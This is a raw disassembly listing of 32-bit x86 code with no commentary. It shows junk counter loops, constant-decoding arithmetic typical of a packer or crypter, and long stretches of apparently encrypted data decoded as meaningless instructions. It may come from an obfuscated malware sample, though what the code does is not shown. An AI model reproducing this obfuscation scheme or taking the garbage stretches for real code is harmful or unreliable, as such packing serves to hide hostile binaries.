  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4304a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e766,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e766
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e766,ecx
  403899:	cmp    DWORD PTR ds:0x42e766,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e766,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42e9dc
  4038bc:	cmp    DWORD PTR ds:0x42e766,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e766
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e766,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ee28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ee28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ee28,edi
  403903:	cmp    DWORD PTR ds:0x42ee28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42e9f4
  403920:	cmp    DWORD PTR ds:0x42ee28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ee28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ee28,edi
  40393a:	cmp    DWORD PTR ds:0x42ee28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42eb9c
  403988:	cmp    DWORD PTR ds:0x42ee1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4304a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43048e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4304aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4304aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4304aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42e9e0
  403a03:	mov    edi,DWORD PTR ds:0x4304aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4304aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ee30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4304aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43055a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43055a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43055a,edx
  403a58:	cmp    DWORD PTR ds:0x43055a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42e9f8
  403a77:	cmp    DWORD PTR ds:0x43055a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430542,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e75a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43054a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43048a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430592
  403aee:	mov    edx,DWORD PTR ds:0x42e9b0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4304b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4304aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4304aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4304aa,edx
  403b28:	cmp    DWORD PTR ds:0x4304aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eac0
  403b43:	cmp    DWORD PTR ds:0x4304aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4304aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4304aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4304aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430542,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430492,0x430552
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43048e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43048a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4304c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ee20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ee30
  403bc5:	and    ebx,DWORD PTR ds:0x430552
  403bcb:	mov    DWORD PTR ds:0x42ee30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e75a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e75a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e75a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e75a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42e9fc
  403c05:	cmp    DWORD PTR ds:0x42e75a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4304c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43048e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43048e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43048e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea00
  403c4d:	cmp    DWORD PTR ds:0x43048e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43048e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43048e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43048e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43048e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43054e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43054a,0x4304c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430486
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43054a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ee24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43048a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4304ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e776
  403ce8:	adc    DWORD PTR ds:0x42ee10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4304aa
  403cfb:	sbb    DWORD PTR ds:0x42e76e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax+0x1784326d],0x78
  403d2b:	xor    eax,0x7e7e11b6
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403ceb
  403d35:	ret    0x9b8c
  403d38:	push   ecx
  403d39:	ret    0xf794
  403d3c:	dec    ecx
  403d3d:	mov    edx,0x14b8aeb6
  403d42:	add    ebx,DWORD PTR [esi]
  403d44:	and    al,0x12
  403d46:	dec    ebp
  403d47:	in     al,dx
  403d48:	pushf  
  403d49:	int3   
  403d4a:	stos   BYTE PTR es:[edi],al
  403d4b:	xchg   BYTE PTR [eax-0x2f9a28e4],ah
  403d51:	test   al,0x8d
  403d53:	gs aad 0xa8
  403d56:	inc    edi
  403d57:	ins    BYTE PTR es:[edi],dx
  403d58:	inc    esp
  403d59:	je     0x403cf6
  403d5b:	add    dh,BYTE PTR gs:[esi]
  403d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5f:	retf   0x8ca2
  403d62:	inc    esp
  403d63:	cmp    al,0x13
  403d65:	daa    
  403d66:	dec    eax
  403d67:	and    BYTE PTR [esi+0x7e],bl
  403d6a:	lods   eax,DWORD PTR ds:[esi]
  403d6b:	pop    esp
  403d6c:	test   DWORD PTR [ebx+0x25],esp
  403d6f:	nop
  403d70:	gs mov edi,0xba9bdb1b
  403d76:	and    al,0x8d
  403d78:	add    BYTE PTR [edx],bh
  403d7a:	cmc    
  403d7b:	out    dx,eax
  403d7c:	in     al,0xbe
  403d7e:	jge    0x403db6
  403d80:	jl     0x403d2a
  403d82:	std    
  403d83:	sbb    dh,cl
  403d85:	add    DWORD PTR [ecx+ebx*2],ebx
  403d88:	lock call 0xbd32:0x7d36fdba
  403d90:	pop    esp
  403d91:	dec    esi
  403d92:	rol    BYTE PTR ds:0x383cae78,0xb8
  403d99:	push   eax
  403d9a:	test   BYTE PTR [edx-0x55],0xaa
  403d9e:	jmp    0x19c:0x7827cba9
  403da5:	in     eax,dx
  403da6:	fstp   TBYTE PTR [ecx+0x20]
  403da9:	std    
  403daa:	imul   edx,DWORD PTR es:[ebx+0x11],0xda2a7a16
  403db2:	int    0x88
  403db4:	fnsetpm(287 only) 
  403db6:	pop    edx
  403db7:	cdq    
  403db8:	push   0xb8aff848
  403dbd:	xchg   DWORD PTR [ebx-0x4cc976a0],esp
  403dc3:	inc    edi
  403dc4:	ss call 0x629d6770
  403dca:	fcomp  QWORD PTR ss:[eax-0x29]
  403dce:	push   ebx
  403dcf:	icebp  
  403dd0:	push   es
  403dd1:	push   cs
  403dd2:	enter  0x44ca,0x87
  403dd6:	or     eax,0xd87d74c
  403ddb:	dec    edx
  403ddc:	jmp    0x403dd8
  403dde:	sbb    al,0xc3
  403de0:	rol    BYTE PTR [ecx],0x78
  403de3:	mov    edi,0x5d633d92
  403de8:	pushf  
  403de9:	les    esi,FWORD PTR [ebp-0x1]
  403dec:	call   0x43c6:0x1153cf6c
  403df3:	jbe    0x403dd9
  403df5:	cmc    
  403df6:	push   ecx
  403df7:	and    bh,al
  403df9:	dec    edx
  403dfa:	bswap  edi
  403dfc:	xor    eax,0x3183bf41
  403e01:	xor    edi,DWORD PTR [esi+0x7245bfbf]
  403e07:	xchg   edx,eax
  403e08:	cmp    DWORD PTR [edi],eax
  403e0a:	repz jle 0x403e3a
  403e0d:	lods   eax,DWORD PTR ds:[esi]
  403e0e:	dec    esp
  403e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e10:	mov    DWORD PTR [eax-0x687309f3],esp
  403e16:	cmp    al,0xf9
  403e18:	sbb    bh,BYTE PTR [edx]
  403e1a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e1c:	stos   DWORD PTR es:[edi],eax
  403e1d:	ficomp WORD PTR [ecx+eiz*2]
  403e20:	in     eax,0x46
  403e22:	jns    0x403dab
  403e24:	sub    esp,DWORD PTR es:[ebx+0x73f471cf]
  403e2b:	shr    DWORD PTR ds:0x17437b2a,0x15
  403e32:	cld    
  403e33:	mov    al,0x34
  403e35:	adc    bh,al
  403e37:	pop    edi
  403e38:	add    cl,BYTE PTR [eax+0x70d89517]
  403e3e:	xchg   ebp,eax
  403e3f:	shl    edx,cl
  403e41:	pop    edi
  403e42:	hlt    
  403e43:	inc    edx
  403e44:	dec    ebx
  403e45:	mov    ebp,0x365ba07f
  403e4a:	gs jmp 0xc1f6970a
  403e50:	jb     0x403e1f
  403e52:	cs mov esp,?
  403e55:	push   0xa
  403e57:	loope  0x403e69
  403e59:	int3   
  403e5a:	mov    edx,0x122771e1
  403e5f:	stos   BYTE PTR es:[edi],al
  403e60:	jmp    0xdfac:0x16fdece2
  403e67:	adc    ebp,DWORD PTR [esi-0x20012463]
  403e6d:	inc    edx
  403e6e:	jb     0x403e92
  403e70:	daa    
  403e71:	(bad)  
  403e73:	test   ebp,edx
  403e75:	mov    ebx,0x4072119b
  403e7a:	loopne 0x403e08
  403e7c:	test   esp,esi
  403e7e:	test   al,0x11
  403e80:	or     dh,bl
  403e82:	jmp    0x4bf4:0xb80d0ca4
  403e89:	popa   
  403e8a:	test   eax,0xd4e30357
  403e8f:	mov    ebx,0xa16fe02a
  403e94:	imul   ebx,DWORD PTR [edi],0x1b225946
  403e9a:	les    eax,FWORD PTR [edi+0x164d53bf]
  403ea0:	pop    ss
  403ea1:	lea    edx,[eax+eax*8]
  403ea4:	addr16 pop ds
  403ea6:	dec    esi
  403ea7:	push   esp
  403ea8:	jg     0x403ea7
  403eaa:	fdivr  QWORD PTR [esp+edi*2]
  403ead:	cmp    bl,BYTE PTR [edx-0x29]
  403eb0:	sbb    DWORD PTR [ecx+0x72],esi
  403eb3:	adc    esp,DWORD PTR [ebx+0x31]
  403eb6:	gs mov bl,0x26
  403eb9:	mov    ebp,0xe5137b14
  403ebe:	in     al,0xc2
  403ec0:	les    ecx,FWORD PTR [ebx+0x4ae9d855]
  403ec6:	pop    es
  403ec7:	add    BYTE PTR [eax],al
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0xf37278c4,al
  403efc:	(bad)  
  403efd:	cmp    eax,esp
  403eff:	ret    
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403ed6
  403f08:	xlat   BYTE PTR ds:[ebx]
  403f09:	add    al,BYTE PTR ds:0xe802e957
  403f0f:	cmc    
  403f10:	jb     0x403ece
  403f12:	jne    0x403f7d
  403f14:	xor    edx,ecx
  403f16:	sub    DWORD PTR [eax-0x52],ecx
  403f19:	out    dx,eax
  403f1a:	imul   edi,DWORD PTR [esi+0x58],0xa0c8ae34
  403f21:	pop    es
  403f22:	sar    DWORD PTR [eax],0x1e
  403f25:	push   cs
  403f26:	lods   eax,DWORD PTR ds:[esi]
  403f27:	in     eax,dx
  403f28:	add    DWORD PTR [ecx-0x380771f0],edi
  403f2e:	test   eax,0xf180dfc4
  403f33:	xchg   edi,eax
  403f34:	pop    edi
  403f35:	mov    DWORD PTR [ebp-0x58],ebx
  403f38:	popf   
  403f39:	cmp    eax,0xd6bbe807
  403f3e:	mov    ebp,0xfa60f339
  403f43:	jne    0x403f00
  403f45:	sub    cl,BYTE PTR [ebp+0x7b]
  403f48:	sub    esi,DWORD PTR [ebx+0x7b]
  403f4b:	repz mov ch,0x54
  403f4e:	or     esp,0xc3601e4e
  403f54:	dec    edx
  403f55:	ins    DWORD PTR es:[edi],dx
  403f56:	(bad)  
  403f57:	push   eax
  403f58:	into   
  403f59:	sub    bl,BYTE PTR es:[esi+eiz*2+0x37]
  403f5e:	inc    edx
  403f5f:	push   esi
  403f60:	in     eax,0xce
  403f62:	ret    0xf15a
  403f65:	jno    0x403f1e
  403f67:	jecxz  0x403f8a
  403f69:	outs   dx,BYTE PTR ds:[esi]
  403f6a:	ss into 
  403f6c:	mov    al,0x4d
  403f6e:	or     bl,BYTE PTR [esi+0x67]
  403f71:	rol    BYTE PTR [eiz*2+0x3627131c],0xf0
  403f79:	fsubr  DWORD PTR [edi+0x62]
  403f7c:	push   ecx
  403f7d:	cmp    edi,DWORD PTR [edx-0x21e27b2a]
  403f83:	xchg   BYTE PTR [esi-0x72e79544],ah
  403f89:	jb     0x403fe9
  403f8b:	scas   al,BYTE PTR es:[edi]
  403f8c:	arpl   sp,si
  403f8e:	jae    0x403fb8
  403f90:	jmp    0x403f5e
  403f92:	adc    DWORD PTR [ebx],0x2fc1d818
  403f98:	dec    ecx
  403f99:	adc    dh,0x5a
  403f9c:	fwait
  403f9d:	mul    BYTE PTR [edi]
  403f9f:	sub    BYTE PTR [ecx-0x12],0x77
  403fa3:	pop    ebp
  403fa4:	jbe    0x40401f
  403fa6:	cmp    eax,0x3e04c7a3
  403fab:	sbb    DWORD PTR [eax-0x29],esp
  403fae:	(bad)  
  403faf:	scas   eax,DWORD PTR es:[edi]
  403fb0:	or     edi,DWORD PTR [edx]
  403fb2:	add    al,0x7c
  403fb4:	inc    ebp
  403fb5:	push   ecx
  403fb6:	mov    esp,DWORD PTR [ecx+0x3d]
  403fb9:	clc    
  403fba:	jbe    0x403fe1
  403fbc:	dec    ebx
  403fbd:	adc    eax,0x288954f6
  403fc2:	xchg   edx,eax
  403fc3:	mov    dl,0xad
  403fc5:	dec    eax
  403fc6:	cwde   
  403fc7:	pop    edi
  403fc8:	inc    esp
  403fc9:	(bad)  
  403fca:	xlat   BYTE PTR ds:[ebx]
  403fcb:	sub    ecx,DWORD PTR [eax]
  403fcd:	jp     0x404037
  403fcf:	in     al,0xb6
  403fd1:	jmp    0x403fb4
  403fd3:	iret   
  403fd4:	push   eax
  403fd5:	loopne 0x403ff7
  403fd7:	and    eax,eax
  403fd9:	or     al,ah
  403fdb:	sub    ah,al
  403fdd:	mov    bl,0xbb
  403fdf:	ret    0x8a2
  403fe2:	(bad)  
  403fe3:	sub    eax,0x2c661b5c
  403fe8:	nop
  403fe9:	dec    eax
  403fea:	push   eax
  403feb:	lahf   
  403fec:	jne    0x403f7f
  403fee:	mov    ds:0x6748a2db,eax
  403ff3:	and    ebx,DWORD PTR [ebx+ebp*8-0x37c484ea]
  403ffa:	inc    esi
  403ffb:	clc    
  403ffc:	int3   
  403ffd:	ret    0x502f
  404000:	ss dec edx
  404002:	ret    
  404003:	xchg   esp,eax
  404004:	data16 cld 
  404006:	aad    0x3
  404008:	ss jns 0x403f99
  40400b:	xor    ch,al
  40400d:	sbb    eax,0xea53f50a
  404012:	cwde   
  404013:	cmp    edi,DWORD PTR [esi]
  404015:	pop    ecx
  404016:	mov    esp,ds
  404018:	lea    esp,[eax]
  40401a:	push   esi
  40401b:	xlat   BYTE PTR ds:[ebx]
  40401c:	or     al,0x1e
  40401e:	es jmp 0x403fc9
  404021:	rol    DWORD PTR [ecx-0x67f65acd],0x8a
  404028:	sbb    esp,eax
  40402a:	cmp    ecx,DWORD PTR [eax-0x26]
  40402d:	outs   dx,DWORD PTR ds:[esi]
  40402e:	push   ds
  40402f:	or     ah,BYTE PTR [edi]
  404031:	imul   ebp,DWORD PTR [eax],0x74
  404034:	sbb    BYTE PTR [edi+0x2b43870d],0x3a
  40403b:	jb     0x40403b
  40403d:	pop    ss
  40403e:	enter  0xde0,0x66
  404042:	jo     0x404030
  404044:	pop    es
  404045:	lock push ss
  404047:	mov    BYTE PTR [eax-0x29a66599],ch
  40404d:	adc    DWORD PTR [edx],ebp
  40404f:	scas   al,BYTE PTR es:[edi]
  404050:	iret   
  404051:	ss jg  0x40400d
  404054:	or     BYTE PTR [edi],al
  404056:	mov    cl,al
  404058:	xchg   esp,eax
  404059:	and    eax,0x693dca69
  40405e:	mov    ch,0x60
  404060:	or     BYTE PTR gs:[edi+0x77bc1dea],dh
  404067:	add    eax,0x61cd87ea
  40406c:	pop    edx
  40406d:	aam    0x53
  40406f:	mov    ebx,0xe1763eb1
  404074:	dec    edi
  404075:	sbb    eax,0x8f99d33
  40407a:	sbb    DWORD PTR [eax-0x12],ebp
  40407d:	xchg   ebx,eax
  40407e:	inc    ecx
  40407f:	adc    BYTE PTR [eax],dl
  404081:	mov    ?,WORD PTR [ebx]
  404083:	repnz mov ch,cl
  404086:	enter  0xc6e3,0x8e
  40408a:	jns    0x40409c
  40408c:	push   0xfffffff5
  40408e:	mov    bl,0x70
  404090:	call   0xd455:0x8bf8335a
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x6cc6017b]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x4040b8
  4040c0:	jb     0x404086
  4040c2:	mov    DWORD PTR [eax],edi
  4040c4:	(bad)  
  4040c5:	mov    ebx,0x5ecf52db
  4040ca:	clc    
  4040cb:	call   0x32e2:0xbddef8ef
  4040d2:	outs   dx,BYTE PTR ds:[esi]
  4040d3:	pop    ds
  4040d4:	add    eax,0xc7c5982
  4040d9:	adc    DWORD PTR ds:0x432b7f45,0xffffffb6
  4040e0:	and    ch,BYTE PTR [esi]
  4040e2:	shl    DWORD PTR [esi-0x7d],0x35
  4040e6:	jmp    0x54dd3170
  4040eb:	and    al,0x91
  4040ed:	mov    ecx,0xc2fc4202
  4040f2:	mov    esp,0x6e739373
  4040f7:	(bad)  
  4040f8:	inc    esi
  4040f9:	ror    BYTE PTR [ecx+ecx*8-0x2e],0xf1
  4040fe:	push   ss
  4040ff:	ins    BYTE PTR es:[edi],dx
  404100:	loopne 0x4040c6
  404102:	into   
  404103:	je     0x4040b4
  404105:	rcl    BYTE PTR [ecx+edi*4-0x1b954f7b],0xd8
  40410d:	jmp    0xc151:0xb79bbcf6
  404114:	pop    edx
  404115:	xor    bl,BYTE PTR [edx]
  404117:	fimul  WORD PTR [eax-0x3e18a6be]
  40411d:	outs   dx,BYTE PTR ds:[esi]
  40411f:	popa   
  404120:	cmp    al,0x3b
  404122:	inc    esi
  404123:	fwait
  404124:	in     eax,0x81
  404126:	xor    ecx,DWORD PTR [edi]
  404128:	das    
  404129:	mov    BYTE PTR [edx+0x27],bh
  40412c:	xor    bl,BYTE PTR [edi]
  40412e:	cmp    esi,DWORD PTR [eax+eiz*4-0x5694e330]
  404135:	(bad)  
  404136:	jmp    0x404134
  404138:	sar    DWORD PTR [ebx-0x6e],1
  40413b:	xlat   BYTE PTR ds:[ebx]
  40413c:	pushf  
  40413d:	icebp  
  40413e:	or     dl,ch
  404140:	mov    edi,0xed6dd593
  404145:	mov    cl,0xa8
  404147:	inc    ebx
  404148:	pop    esi
  404149:	or     bh,BYTE PTR [ebx-0x1c]
  40414c:	lods   eax,DWORD PTR ds:[esi]
  40414d:	fist   DWORD PTR [edi]
  40414f:	pop    esi
  404150:	adc    ebp,DWORD PTR [esi]
  404152:	test   al,0xc5
  404154:	imul   esp,edi,0x4827740d
  40415a:	push   cs
  40415b:	or     dh,al
  40415d:	es jbe 0x4041b6
  404160:	or     al,0x5c
  404162:	and    eax,DWORD PTR [esp+ebx*1-0x7aacf592]
  404169:	(bad)  
  40416a:	and    al,dh
  40416c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40416d:	sbb    DWORD PTR [bx+di+0x48],edx
  404171:	add    eax,0x547bcc56
  404176:	fnstcw WORD PTR [esi+ebp*2]
  404179:	adc    DWORD PTR [esi-0x4da89477],esi
  40417f:	mov    al,0x4d
  404181:	or     esp,DWORD PTR [ebp+eiz*4+0x42]
  404185:	dec    ebx
  404186:	call   0xc57e7f77
  40418b:	mov    ?,WORD PTR [eax+0x3188103b]
  404191:	add    eax,0x7bdfd560
  404196:	inc    esi
  404197:	scas   al,BYTE PTR es:[edi]
  404198:	add    eax,0x32a6f21d
  40419d:	mov    cl,0x9e
  40419f:	mov    WORD PTR [ecx+0x7ff734aa],fs
  4041a5:	inc    ecx
  4041a6:	mov    cl,BYTE PTR [ecx-0x72]
  4041a9:	cmp    BYTE PTR gs:[edi],ch
  4041ac:	cmp    esp,eax
  4041ae:	sub    edx,edx
  4041b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b1:	or     DWORD PTR [esi+0x46],ebx
  4041b4:	lods   eax,DWORD PTR ds:[esi]
  4041b5:	not    BYTE PTR fs:[edi]
  4041b8:	sbb    DWORD PTR [eax-0x6b],eax
  4041bb:	pop    ds
  4041bc:	xor    eax,0xc036be08
  4041c1:	fldenv [edi]
  4041c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041c4:	fcmovnb st,st(4)
  4041c6:	push   cs
  4041c7:	shl    dl,cl
  4041c9:	xchg   esp,eax
